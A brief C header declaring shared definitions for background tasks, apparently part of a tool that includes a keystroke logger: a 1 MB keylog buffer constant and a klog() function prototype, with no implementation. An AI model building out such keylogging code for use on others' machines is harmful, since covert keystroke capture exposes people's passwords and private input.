/*
 * Common Definitions for Background Tasks (e.g., Keystroke Logger, Token Guard, etc.)
 */

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#else
// Non-Windows platform - define minimal Windows types for compatibility
typedef void* HANDLE;
#endif

#define KEYLOG_BUFFER 1048576

void klog(char * buffer, HANDLE lock, char * fmt, ...);